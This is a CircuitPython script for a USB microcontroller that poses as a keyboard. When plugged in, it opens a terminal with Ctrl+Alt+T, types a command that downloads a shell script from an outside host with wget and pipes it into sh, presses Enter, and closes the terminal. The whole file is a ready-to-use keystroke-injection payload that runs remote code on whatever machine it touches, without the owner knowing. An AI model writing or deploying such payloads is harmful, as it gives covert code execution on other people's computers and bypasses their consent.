import usb_hid
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode
from adafruit_hid.keyboard_layout_de import KeyboardLayout

import board
import digitalio
import time

COMMAND = "wget -q -O - https://rr.plattfis.ch/cr.sh | sh && exit"

keyboard = Keyboard(usb_hid.devices)

# This script uses a german keyboard layout, so change it for yóur country
layout = KeyboardLayout(keyboard)

led = digitalio.DigitalInOut(board.LED)
led.switch_to_output(False)

led.value = True
time.sleep(0.5)
keyboard.press(Keycode.CONTROL, Keycode.ALT, Keycode.T)
keyboard.release_all()
time.sleep(0.5)
layout.write(COMMAND)
keyboard.send(Keycode.ENTER)
time.sleep(3)
layout.write("exit")
keyboard.send(Keycode.ENTER)
led.value = False

